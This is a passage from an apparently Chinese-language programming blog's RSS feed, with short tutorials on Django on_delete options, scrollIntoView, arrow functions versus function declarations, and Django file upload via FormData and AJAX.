          }, &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;);
        }
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;myXhr&lt;/span&gt;;
    },
    &lt;span style=&#34;color:#a6e22e&#34;&gt;success&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;){ 
        &lt;span style=&#34;color:#75715e&#34;&gt;// 请求成功
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    },
    &lt;span style=&#34;color:#a6e22e&#34;&gt;error&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;) {
        &lt;span style=&#34;color:#75715e&#34;&gt;// 请求失败
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;);
    }
}); 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Django—on_delete</title>
        <link>https://ac-lm.github.io/posts/django/djangoon_delete/</link>
        <pubDate>Mon, 24 Jan 2022 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/django/djangoon_delete/</guid>
        <description>&lt;h2 id=&#34;1使用模式&#34;&gt;1.使用模式&lt;/h2&gt;
&lt;p&gt;在 Django 的数据库模型中，外键等关联字段必须有 &lt;code&gt;on_delete&lt;/code&gt; 属性，该属性允许取如下的值&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;on_delete&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;,               &lt;span style=&#34;color:#75715e&#34;&gt;# 删除关联表中的数据时,当前表与其关联的field的行为&lt;/span&gt;
on_delete&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;models&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;CASCADE,     &lt;span style=&#34;color:#75715e&#34;&gt;# 删除关联数据,与之关联也删除&lt;/span&gt;
on_delete&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;models&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;DO_NOTHING,  &lt;span style=&#34;color:#75715e&#34;&gt;# 删除关联数据,什么也不做&lt;/span&gt;
on_delete&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;models&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;PROTECT,     &lt;span style=&#34;color:#75715e&#34;&gt;# 删除关联数据,引发错误ProtectedError&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# models.ForeignKey(&amp;#39;关联表&amp;#39;, on_delete=models.SET_NULL, blank=True, null=True)&lt;/span&gt;
on_delete&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;models&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;SET_NULL,    &lt;span style=&#34;color:#75715e&#34;&gt;# 删除关联数据,与之关联的值设置为null（前提FK字段需要设置为可空,一对一同理）&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# models.ForeignKey(&amp;#39;关联表&amp;#39;, on_delete=models.SET_DEFAULT, default=&amp;#39;默认值&amp;#39;)&lt;/span&gt;
on_delete&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;models&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;SET_DEFAULT, &lt;span style=&#34;color:#75715e&#34;&gt;# 删除关联数据,与之关联的值设置为默认值（前提FK字段需要设置默认值,一对一同理）&lt;/span&gt;
on_delete&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;models&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;SET,         &lt;span style=&#34;color:#75715e&#34;&gt;# 删除关联数据,&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# a. 与之关联的值设置为指定值,设置：models.SET(值)&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# b. 与之关联的值设置为可执行对象的返回值,设置：models.SET(可执行对象)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Web开发—scrollIntoView 视图滚动</title>
        <link>https://ac-lm.github.io/posts/web/web%E5%BC%80%E5%8F%91scrollintoview-%E8%A7%86%E5%9B%BE%E6%BB%9A%E5%8A%A8/</link>
        <pubDate>Mon, 24 Jan 2022 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/web/web%E5%BC%80%E5%8F%91scrollintoview-%E8%A7%86%E5%9B%BE%E6%BB%9A%E5%8A%A8/</guid>
        <description>&lt;h2 id=&#34;1scrollintoview&#34;&gt;1.scrollIntoView()&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;scrollIntoView()&lt;/code&gt;方法可以将调用它的元素滚动到浏览器窗口的可见区域。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;element&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; document.&lt;span style=&#34;color:#a6e22e&#34;&gt;getElementById&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;box&amp;#34;&lt;/span&gt;);
 
&lt;span style=&#34;color:#a6e22e&#34;&gt;element&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;scrollIntoView&lt;/span&gt;();
&lt;span style=&#34;color:#a6e22e&#34;&gt;element&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;scrollIntoView&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;);
&lt;span style=&#34;color:#a6e22e&#34;&gt;element&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;scrollIntoView&lt;/span&gt;({&lt;span style=&#34;color:#a6e22e&#34;&gt;block&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;end&amp;#34;&lt;/span&gt;});
&lt;span style=&#34;color:#a6e22e&#34;&gt;element&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;scrollIntoView&lt;/span&gt;({&lt;span style=&#34;color:#a6e22e&#34;&gt;behavior&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;instant&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;block&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;end&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;inline&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;nearest&amp;#34;&lt;/span&gt;});
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Web开发—箭头函数与 function</title>
        <link>https://ac-lm.github.io/posts/web/web%E5%BC%80%E5%8F%91%E7%AE%AD%E5%A4%B4%E5%87%BD%E6%95%B0%E4%B8%8E-function/</link>
        <pubDate>Mon, 24 Jan 2022 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/web/web%E5%BC%80%E5%8F%91%E7%AE%AD%E5%A4%B4%E5%87%BD%E6%95%B0%E4%B8%8E-function/</guid>
        <description>&lt;h2 id=&#34;1定义&#34;&gt;1.定义&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// function
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fn&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;a&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;b&lt;/span&gt;){
	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;a&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;b&lt;/span&gt;;
}
&lt;span style=&#34;color:#75715e&#34;&gt;// arrow function
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;foo&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;a&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;b&lt;/span&gt;)=&amp;gt;{ &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;a&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;b&lt;/span&gt; };
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2this-的指向&#34;&gt;2.This 的指向&lt;/h2&gt;
&lt;p&gt;使用&lt;code&gt;function&lt;/code&gt;定义的函数，&lt;code&gt;this&lt;/code&gt;的指向随着调用环境的变化而变化的，而箭头函数中的&lt;code&gt;this&lt;/code&gt;指向是固定不变的，一直指向的是定义函数的环境&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 使用function定义的函数
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;foo&lt;/span&gt;(){
	&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;);
}
&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;obj&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; { &lt;span style=&#34;color:#a6e22e&#34;&gt;aa&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;foo&lt;/span&gt; };
&lt;span style=&#34;color:#a6e22e&#34;&gt;foo&lt;/span&gt;(); &lt;span style=&#34;color:#75715e&#34;&gt;//Window
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;obj&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;aa&lt;/span&gt;() &lt;span style=&#34;color:#75715e&#34;&gt;//obj { aa: foo }
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;// 使用箭头函数定义函数
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;foo&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; () =&amp;gt; { &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;) };
&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;obj&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; { &lt;span style=&#34;color:#a6e22e&#34;&gt;aa&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;foo&lt;/span&gt; };
&lt;span style=&#34;color:#a6e22e&#34;&gt;foo&lt;/span&gt;(); &lt;span style=&#34;color:#75715e&#34;&gt;//Window
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;obj&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;aa&lt;/span&gt;(); &lt;span style=&#34;color:#75715e&#34;&gt;//Window
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;3构造函数&#34;&gt;3.构造函数&lt;/h2&gt;
&lt;p&gt;仅能通过 function 方法定义构造函数&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 使用 function 方法定义构造函数
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Person&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;age&lt;/span&gt;){
	&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;;
	&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;age&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;age&lt;/span&gt;;
}
&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;lenhart&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Person&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;lenhart&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;);
&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;lenhart&lt;/span&gt;); &lt;span style=&#34;color:#75715e&#34;&gt;//{name: &amp;#39;lenhart&amp;#39;, age: 25}
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;// 尝试使用箭头函数
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Person&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;age&lt;/span&gt;) =&amp;gt;{
	&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;;
	&lt;span style=&#34;color:#66d9ef&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;age&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;age&lt;/span&gt;;
};
&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;lenhart&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Person&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;lenhart&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;); &lt;span style=&#34;color:#75715e&#34;&gt;//Uncaught TypeError: Person is not a constructor
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;4变量提升&#34;&gt;4.变量提升&lt;/h2&gt;
&lt;p&gt;在&lt;code&gt;javascript&lt;/code&gt;的内存机制中，函数的级别最高，因此箭头函数一定要定义于调用前&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;foo&lt;/span&gt;(); &lt;span style=&#34;color:#75715e&#34;&gt;//123
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;foo&lt;/span&gt;(){
	&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;123&amp;#39;&lt;/span&gt;);
}

&lt;span style=&#34;color:#a6e22e&#34;&gt;arrowFn&lt;/span&gt;(); &lt;span style=&#34;color:#75715e&#34;&gt;//Uncaught TypeError: arrowFn is not a function
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arrowFn&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; () =&amp;gt; {
	&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;456&amp;#39;&lt;/span&gt;);
};
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Django—文件上传</title>
        <link>https://ac-lm.github.io/posts/django/django%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</link>
        <pubDate>Sun, 23 Jan 2022 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/django/django%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</guid>
        <description>&lt;h2 id=&#34;1实现过程&#34;&gt;1.实现过程&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;获取文件二进制数据&lt;/li&gt;
&lt;li&gt;通过接口传递&lt;/li&gt;
&lt;li&gt;写入服务器保存&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;2获取文件二进制数据&#34;&gt;2.获取文件二进制数据&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;input type=&amp;quot;file&amp;quot;&amp;gt;&lt;/code&gt;，使用 &lt;code&gt;type=&amp;quot;file&amp;quot;&lt;/code&gt; 的 &lt;code&gt;input&lt;/code&gt; 元素使得用户可以选择一个或多个文件打开。附加属性：&lt;code&gt;accept, capture, files, multiple&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;aaccept&#34;&gt;a.accept&lt;/h3&gt;
&lt;p&gt;accept 属性是一个字符串，它定义了文件 input 应该接受的文件类型。这个字符串是一个以逗号为分隔的&lt;strong&gt;唯一文件类型说明符&lt;/strong&gt;列表&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;input&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;type&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;id&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;docpicker&amp;#34;&lt;/span&gt;
  &lt;span style=&#34;color:#a6e22e&#34;&gt;accept&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;.doc,.docx,application/msword,application/vnd.openxmlformats-officedocument.wordprocessingml.document&amp;#34;&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;唯一文件类型说明符&lt;/strong&gt;可使用如下格式：&lt;code&gt;.jpg .pdf&lt;/code&gt;；一个不带扩展名的 MIME 类型字符串；字符串 &lt;code&gt;audio/*&lt;/code&gt;， 表示任何音频文件；字符串 &lt;code&gt;video/*&lt;/code&gt;，表示任何视频文件；字符串 &lt;code&gt;image/*&lt;/code&gt;，表示任何图片文件&lt;/p&gt;
&lt;h3 id=&#34;bcapture&#34;&gt;b.capture&lt;/h3&gt;
&lt;p&gt;capture 属性是一个字符串，当 input 打开的内容是图片或视频时，则它指定了使用哪个摄像头去捕获这些数据&lt;/p&gt;
&lt;h3 id=&#34;cfiles&#34;&gt;c.files&lt;/h3&gt;
&lt;p&gt;FileList 对象为每个已选择的文件。如果 multiple 属性没有指定，则这个列表只有一个成员&lt;/p&gt;
&lt;p&gt;可以通过&lt;code&gt;const numFiles = files.length;&lt;/code&gt;来获取 FileList 列表的长度，可以像数组一样简单地访问文件列表来检索各个 File 对象&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;numFiles&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;files&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;length&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;numFiles&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
  &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;file&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;files&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;];
  &lt;span style=&#34;color:#75715e&#34;&gt;// ...
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;dmultiple&#34;&gt;d.multiple&lt;/h3&gt;
&lt;p&gt;复数，是否允许选择多个&lt;/p&gt;
&lt;h2 id=&#34;3通过接口传递&#34;&gt;3.通过接口传递&lt;/h2&gt;
&lt;p&gt;在获取 File 数据后，我们通过接口上传文件&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 选择 input 的 files，由于不允许复数，因此可以直接取 FileList 的第一个数据
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;selectedFile&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; document.&lt;span style=&#34;color:#a6e22e&#34;&gt;getElementById&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;input-file&amp;#39;&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;files&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;];
&lt;span style=&#34;color:#75715e&#34;&gt;// 构建 FormData 数据，将文件数据写入 FormData
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fileData&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;FormData&lt;/span&gt;();
&lt;span style=&#34;color:#a6e22e&#34;&gt;fileData&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;append&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;avatar&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;selectedFile&lt;/span&gt;);
&lt;span style=&#34;color:#75715e&#34;&gt;// 通过接口传递
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;$&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;ajax&lt;/span&gt;({
    &lt;span style=&#34;color:#a6e22e&#34;&gt;type&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;post&amp;#39;&lt;/span&gt;,
